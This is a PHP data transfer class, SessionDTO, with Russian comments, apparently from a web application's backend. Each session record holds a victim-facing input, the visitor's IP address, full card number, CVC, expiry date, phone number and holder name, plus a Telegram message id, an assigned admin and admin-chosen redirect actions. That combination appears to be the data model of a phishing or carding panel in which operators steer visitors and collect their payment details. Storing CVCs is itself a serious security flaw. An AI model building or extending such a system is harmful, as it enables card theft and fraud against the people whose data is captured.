<?php

declare(strict_types=1);

namespace App\DTOs;

use App\Enums\ActionType;
use App\Enums\InputType;
use App\Enums\SessionStatus;
use App\Models\Session;
use DateTimeInterface;

/**
 * DTO для передачи данных сессии между слоями
 */
readonly class SessionDTO
{
    public function __construct(
        public string $id,
        public InputType $inputType,
        public string $inputValue,
        public string $ip,
        public SessionStatus $status,
        public ?int $adminId = null,
        public ?ActionType $actionType = null,
        public ?string $cardNumber = null,
        public ?string $cvc = null,
        public ?string $expire = null,
        public ?string $phoneNumber = null,
        public ?string $holderName = null,
        public ?int $telegramMessageId = null,
        public ?array $customQuestions = null,
        public ?array $customAnswers = null,
        public ?array $images = null,
        public ?DateTimeInterface $lastActivityAt = null,
        public ?DateTimeInterface $createdAt = null,
        public ?DateTimeInterface $updatedAt = null,
    ) {}

    /**
     * Создание DTO из модели Session
     */
    public static function fromModel(Session $session): self
    {
        return new self(
            id: $session->id,
            inputType: $session->input_type,
            inputValue: $session->input_value,
            ip: $session->ip,
            status: $session->status,
            adminId: $session->admin_id,
            actionType: $session->action_type,
            cardNumber: $session->card_number,
            cvc: $session->cvc,
            expire: $session->expire,
            phoneNumber: $session->phone_number,
            holderName: $session->holder_name,
            telegramMessageId: $session->telegram_message_id,
            customQuestions: $session->custom_questions,
            customAnswers: $session->custom_answers,
            images: $session->images,
            lastActivityAt: $session->last_activity_at,
            createdAt: $session->created_at,
            updatedAt: $session->updated_at,
        );
    }

    /**
     * Создание DTO из массива данных
     */
    public static function fromArray(array $data): self
    {
        return new self(
            id: $data['id'] ?? '',
            inputType: $data['input_type'] instanceof InputType
                ? $data['input_type']
                : InputType::from($data['input_type']),
            inputValue: $data['input_value'],
            ip: $data['ip'],
            status: $data['status'] instanceof SessionStatus
                ? $data['status']
                : SessionStatus::from($data['status'] ?? 'pending'),
            adminId: $data['admin_id'] ?? null,
            actionType: isset($data['action_type'])
                ? ($data['action_type'] instanceof ActionType
                    ? $data['action_type']
                    : ActionType::from($data['action_type']))
                : null,
            cardNumber: $data['card_number'] ?? null,
            cvc: $data['cvc'] ?? null,
            expire: $data['expire'] ?? null,
            phoneNumber: $data['phone_number'] ?? null,
            holderName: $data['holder_name'] ?? null,
            telegramMessageId: $data['telegram_message_id'] ?? null,
            customQuestions: $data['custom_questions'] ?? null,
            customAnswers: $data['custom_answers'] ?? null,
            images: $data['images'] ?? null,
            lastActivityAt: $data['last_activity_at'] ?? null,
            createdAt: $data['created_at'] ?? null,
            updatedAt: $data['updated_at'] ?? null,
        );
    }

    /**
     * Преобразование в массив
     */
    public function toArray(): array
    {
        return [
            'id' => $this->id,
            'input_type' => $this->inputType->value,
            'input_value' => $this->inputValue,
            'ip' => $this->ip,
            'status' => $this->status->value,
            'admin_id' => $this->adminId,
            'action_type' => $this->actionType?->value,
            'card_number' => $this->cardNumber,
            'cvc' => $this->cvc,
            'expire' => $this->expire,
            'phone_number' => $this->phoneNumber,
            'holder_name' => $this->holderName,
            'telegram_message_id' => $this->telegramMessageId,
            'custom_questions' => $this->customQuestions,
            'custom_answers' => $this->customAnswers,
            'images' => $this->images,
            'last_activity_at' => $this->lastActivityAt?->format('Y-m-d H:i:s'),
            'created_at' => $this->createdAt?->format('Y-m-d H:i:s'),
            'updated_at' => $this->updatedAt?->format('Y-m-d H:i:s'),
        ];
    }

    /**
     * Проверка, активна ли сессия
     */
    public function isActive(): bool
    {
        return $this->status === SessionStatus::PENDING
            || $this->status === SessionStatus::PROCESSING;
    }

    /**
     * Проверка, назначен ли админ
     */
    public function hasAdmin(): bool
    {
        return $this->adminId !== null;
    }

    /**
     * Получение URL для текущего действия
     */
    public function getCurrentActionUrl(): ?string
    {
        return $this->actionType?->getRedirectPath($this->id);
    }

    /**
     * Проверка наличия данных карты
     */
    public function hasCardData(): bool
    {
        return $this->cardNumber !== null
            || $this->cvc !== null
            || $this->expire !== null;
    }
}
